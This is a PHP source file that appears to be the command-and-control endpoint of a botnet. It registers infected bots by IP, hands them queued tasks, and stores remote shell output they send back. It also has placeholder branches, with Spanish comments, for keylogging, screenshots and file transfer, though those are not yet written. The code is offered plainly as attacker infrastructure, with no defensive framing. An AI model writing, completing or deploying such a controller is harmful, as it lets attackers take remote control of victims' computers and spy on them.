<?php

	require_once("db.php");
	require_once("security.php");


	$option = trim($_GET['option']);
	$sub_option = trim($_GET['sub_option']);
	$data = trim($_GET['data']);
	$token = trim($_GET['token']);
	$botid = trim($_GET['bid']);

	$ip = $_SERVER['REMOTE_ADDR'];	

	$REGISTER = base64_encode("^register");	
	$OK = base64_encode("!OK");
	$NO = base64_encode("!NO");

	
	//GET OR POST
	if(empty($option) && !empty($_POST['option']))
		$option = trim($_POST['option']);
	if(empty($sub_option) && !empty($_POST['sub_option']))
		$sub_option = trim($_POST['sub_option']);
	if(empty($data) && !empty($_POST['data']))
		$data = trim($_POST['data']);
	if(empty($token) && !empty($_POST['token']))
		$token = trim($_POST['token']);
	if(empty($botid) && !empty($_POST['bid']))
		$botid = trim($_POST['bid']);

	
	//Decode and Secure input
//	if(!empty($data))
//		$data = base64_decode($data);	

	$option = __security_input($option,0);
	$sub_option = __security_input($sub_option,0);

//	$data = __security_input($data,0);
	$data = base64_decode($data);
//	$data = __security_input($data, 0);

	$token = __security_input($token,0);
	$botid = __security_input($botid,0);



	// OPTIONS :)
	switch($option) {
		case 0:			// login
			if(__db_bot_new($ip,$botid)==1) {
				echo($REGISTER);
			}
	
			else {
				echo(__db_task_pop($botid));
			}

			break;		

		case 1:	// bot reply
			//$data = str_replace("\r","\n",$data);
			//$data = str_replace("\t"," ",$data);
			$data = htmlspecialchars($data, ENT_SUBSTITUTE, UTF-8);
			//debug
			$file = fopen("/tmp/prueba001.txt", "a");
			fwrite($file, $data);
			fclose($file);

			if(__db_bot_id_exists($botid)!=NULL)
				__db_shell_push($botid, $data . "\n");
			
			break;

		case 2:			// bot reply log
			break;

		case 3:			// shell reply log

			break;

		case 4:			// upload file
			if($sub_option==0) {
				// crea archivo y responde token
			}
			else if($sub_option==1) {
				// escribe el archivo segun el token
			}
			else {
				// cierra el archivo
			}

			break;
		
		case 5:			// download file
			break;
	

		case 6:			// keylogger
                        if($sub_option==0) {
                                // crea entrada si no existe y responde el token
                        }
                        else if($sub_option==1) {
                                // escribe una nueva entrada con los datos recogidos
                        }

			break;


		case 7:			//screenshot
                        if($sub_option==0) {
                                // crea archivo y responde token
                        }
                        else if($sub_option==1) {
                                // escribe el archivo segun el token
                        }
                        else {
                                // cierra el archivo
                        }

			break;

		case "":
		default:
			break;
	}

?>
